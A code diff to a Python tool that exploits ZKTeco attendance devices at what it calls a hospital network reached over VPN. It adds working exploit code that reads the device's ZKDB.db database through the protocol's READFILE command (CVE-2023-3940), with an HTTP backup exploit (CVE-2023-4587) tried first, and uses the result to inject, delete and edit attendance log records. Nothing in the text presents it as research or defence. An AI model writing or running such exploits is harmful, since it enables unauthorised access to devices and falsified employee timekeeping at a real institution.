@@ -1356,30 +1356,128 @@ def _attlog_web_candidates(web_ip, device_ip=None):
     return out
 
 
-def _attlog_download_zkdb_with_fallback(web_candidates, out_path, timeout_s=8, progress_cb=None):
-    """Try downloading ZKDB.db from each web candidate in order. Returns (data, used_ip).
+def _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60):
+    """Download ZKDB.db from ZK device via protocol READFILE (0x6A6) - CVE-2023-3940.
 
-    progress_cb(str) is called with each attempt + result so UI can show live progress.
-    Raises RuntimeError('all web candidates failed: <ip1>=<err>; <ip2>=<err>; ...') at the end.
+    Use this as FALLBACK when web backup (CVE-2023-4587) is not reachable
+    (e.g. Sophos VPN only routes 2 IPs, but the Web UI IP is one of them).
+    Path: /mnt/mtdblock/data/ZKDB.db (confirmed on X628 PRO FW 6.60).
+    Returns the SQLite data bytes; raises RuntimeError on failure.
     """
-    last_err = None
+    from zk import ZK, const
+    from struct import unpack
+    import socket
+    try:
+        zk = ZK(device_ip, port=4370, timeout=15, password=0)
+        conn = zk.connect()
+    except Exception as e:
+        raise RuntimeError('connect failed: {}'.format(str(e)[:80]))
+    if not conn:
+        raise RuntimeError('connect returned None')
+    try:
+        try:
+            conn.disable_device()
+        except Exception:
+            pass
+        # Send FREE_DATA first (clear any leftover buffers)
+        try:
+            conn._ZK__send_command(const.CMD_FREE_DATA, b'')
+        except Exception:
+            pass
+        import time as _time
+        _time.sleep(0.3)
+        # Send READFILE (0x6A6) with full path
+        path = b'/mnt/mtdblock/data/ZKDB.db\x00'
+        try:
+            conn._ZK__send_command(0x6A6, path, response_size=1024)
+        except Exception as e:
+            raise RuntimeError('READFILE send failed: {}'.format(str(e)[:80]))
+        # Read chunks from raw socket
+        sock = conn._ZK__sock
+        sock.settimeout(min(15, timeout_s))
+        total = b''
+        chunks = 0
+        start = _time.time()
+        while _time.time() - start < timeout_s:
+            try:
+                chunk = sock.recv(65536)
+                if not chunk:
+                    break
+                if len(chunk) >= 16:
+                    top1, top2, tcp_len = unpack('<HHI', chunk[:8])
+                    zk_cmd = unpack('<H', chunk[8:10])[0]
+                    body = chunk[16:16 + (tcp_len - 8)] if tcp_len > 8 else b''
+                    total += body
+                    chunks += 1
+                    # ACK_OK or final response -> stop
+                    if zk_cmd in (0x07D0, 0x07D1, 2000, 2001):
+                        break
+                else:
+                    if chunks > 0:
+                        break
+            except socket.timeout:
+                break
+            except Exception:
+                break
+        if not total or total[:15] != b'SQLite format 3':
+            raise RuntimeError('not SQLite magic (got {} bytes)'.format(len(total)))
+        with open(out_path, 'wb') as f:
+            f.write(total)
+        return total
+    finally:
+        try:
+            conn.enable_device()
+        except Exception:
+            pass
+        try:
+            conn.disconnect()
+        except Exception:
+            pass
+
+
+def _attlog_download_zkdb_with_fallback(web_candidates, out_path, timeout_s=8, progress_cb=None, device_ip=None):
+    """Try downloading ZKDB.db from each web candidate, then fall back to protocol READFILE.
+
+    Order:
+      1. HTTP /form/DataApp?style=0 on each web_candidate (CVE-2023-4587)
+      2. ZK protocol READFILE 0x6A6 on device_ip port 4370 (CVE-2023-3940)
+
+    progress_cb(str) is called with each attempt + result.
+    Returns (data, used_source) where used_source = web_ip OR 'protocol:<device_ip>'.
+    Raises RuntimeError('all sources failed: ...') at the end.
+    """
     attempts = []
+    # Phase 1: HTTP web backup candidates
     for w in web_candidates:
         if progress_cb:
-            progress_cb('🌐 Đang thử {} ...'.format(w))
+            progress_cb('🌐 HTTP: dang thu {} ...'.format(w))
         try:
             data = _attlog_download_zkdb(w, out_path, timeout_s=timeout_s)
             if progress_cb:
-                progress_cb('✅ {} OK ({:,} bytes)'.format(w, len(data)))
+                progress_cb('✅ HTTP {} OK ({:,} bytes)'.format(w, len(data)))
             return data, w
         except Exception as e:
             err_short = str(e)[:60]
-            last_err = e
-            attempts.append('{}→{}'.format(w, err_short))
-            print('[attlog_download_fallback] {} failed: {}'.format(w, e), flush=True)
+            attempts.append('http://{}→{}'.format(w, err_short))
+            print('[attlog_download_fallback] http {} failed: {}'.format(w, e), flush=True)
             if progress_cb:
-                progress_cb('✗ {}: {}'.format(w, err_short))
+                progress_cb('✗ HTTP {}: {}'.format(w, err_short))
             continue
+    # Phase 2: Protocol READFILE fallback (works when web backup is unreachable)
+    if device_ip:
+        if progress_cb:
+            progress_cb('🔌 Protocol: dang thu {} port 4370 (CVE-2023-3940)...'.format(device_ip))
+        try:
+            data = _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60)
+            if progress_cb:
+                progress_cb('✅ Protocol {} OK ({:,} bytes)'.format(device_ip, len(data)))
+            return data, 'protocol:' + device_ip
+        except Exception as e:
+            err_short = str(e)[:60]
+            attempts.append('zk://{}→{}'.format(device_ip, err_short))
+            print('[attlog_download_fallback] protocol {} failed: {}'.format(device_ip, e), flush=True)
+            if progress_cb:
+                progress_cb('✗ Protocol {}: {}'.format(device_ip, err_short))
     summary = '; '.join(attempts)
     raise RuntimeError('Tất cả web candidates đều fail ({})'.format(summary))
 
@@ -1390,23 +1488,23 @@ def attlog_inject(ip, pin, timestamp, status=0, punch=1, verify_mode=1,
     import sqlite3
     log = []
     log.append('ip={}, pin={}, ts={}, marker={}'.format(ip, pin, timestamp, marker or '(none)'))
-    if progress_cb: progress_cb('⏳ Tải ZKDB.db từ web backup...')
+    if progress_cb: progress_cb('⏳ Tải ZKDB.db (web + protocol fallback)...')
 
-    # 1. Download ZKDB.db từ web backup (auto-fallback chain)
+    # 1. Download ZKDB.db (auto-fallback: web → protocol READFILE)
     db_path = os.path.join(ATTLOG_WORK_DIR, 'inject_{}.db'.format(int(time.time())))
     try:
         web_candidates = _attlog_web_candidates(web_ip, ip)
-        log.append('Thử lần lượt {} web candidates...'.format(len(web_candidates)))
-        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb)
+        log.append('Thử lần lượt {} web candidates → nếu fail sẽ thử protocol port 4370...'.format(len(web_candidates)))
+        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb, device_ip=ip)
         log.append('✅ Downloaded ZKDB.db: {} bytes từ {}'.format(len(sq), used_web))
     except Exception as e:
-        log.append('❌ Web download fail: {}'.format(e))
+        log.append('❌ Web + Protocol download fail: {}'.format(e))
         return {'ok': False, 'error': 'Web download failed: ' + str(e),
                 'log': log,
-                'hint': ('Không tải được ZKDB.db từ bất kỳ web candidate nào.\n\n'
+                'hint': ('Không tải được ZKDB.db từ bất kỳ nguồn nào.\n\n'
                          '🔌 Kiểm tra: VPN Bệnh viện (172.16.x.x) đã bật chưa?\n'
-                         '🌐 Thử lại sau khi mở VPN hoặc kết nối mạng BV.\n'
-                         '💡 Nếu đang ở nhà, không thể ghi ATTLOG từ xa (cần mạng nội bộ BV).')}
+                         '🌐 Web UI May 14 fw ở 172.16.254.202 (cần quyền truy cập).\n'
+                         '🔧 Nếu chỉ tới được máy chấm công: protocol READFILE cũng cần port 4370 mở.')}
 
     # 2. Insert records
     db = sqlite3.connect(db_path)
@@ -1458,16 +1556,16 @@ def attlog_delete_marker(ip, marker, web_ip=None, progress_cb=None):
     """Delete ATTLOG records where CREATE_ID=marker via CVE-2023-3941."""
     import sqlite3
     log = []
-    if progress_cb: progress_cb('Downloading ZKDB.db từ web...')
+    if progress_cb: progress_cb('Downloading ZKDB.db (web → protocol fallback)...')
     db_path = os.path.join(ATTLOG_WORK_DIR, 'delete_{}.db'.format(int(time.time())))
     try:
         web_candidates = _attlog_web_candidates(web_ip, ip)
-        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path)
+        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb, device_ip=ip)
         log.append('Downloaded: {} bytes từ {}'.format(len(sq), used_web))
     except Exception as e:
-        log.append('Web download fail: {}'.format(e))
-        return {'ok': False, 'error': 'web download: ' + str(e),
-                'log': log, 'hint': 'Để trống IP Web để tự động fallback'}
+        log.append('Web+Protocol download fail: {}'.format(e))
+        return {'ok': False, 'error': 'web+protocol download: ' + str(e),
+                'log': log, 'hint': 'Để trống IP Web để tự động fallback; protocol cần port 4370 mở'}
 
     db = sqlite3.connect(db_path)
     cur = db.cursor()
@@ -1510,15 +1608,15 @@ def attlog_edit_time(ip, marker, new_time, web_ip=None, progress_cb=None):
     """Edit ATTLOG Verify_Time for records matching marker."""
     import sqlite3
     log = []
-    if progress_cb: progress_cb('Downloading ZKDB.db từ web...')
+    if progress_cb: progress_cb('Downloading ZKDB.db (web → protocol fallback)...')
     db_path = os.path.join(ATTLOG_WORK_DIR, 'edit_{}.db'.format(int(time.time())))
     try:
         web_candidates = _attlog_web_candidates(web_ip, ip)
-        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path)
+        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb, device_ip=ip)
         log.append('Downloaded: {} bytes từ {}'.format(len(sq), used_web))
     except Exception as e:
-        log.append('Web download fail: {}'.format(e))
-        return {'ok': False, 'error': 'web download: ' + str(e),
+        log.append('Web+Protocol download fail: {}'.format(e))
+        return {'ok': False, 'error': 'web+protocol download: ' + str(e),
                 'log': log, 'hint': 'Để trống IP Web để tự động fallback'}
 
     db = sqlite3.connect(db_path)
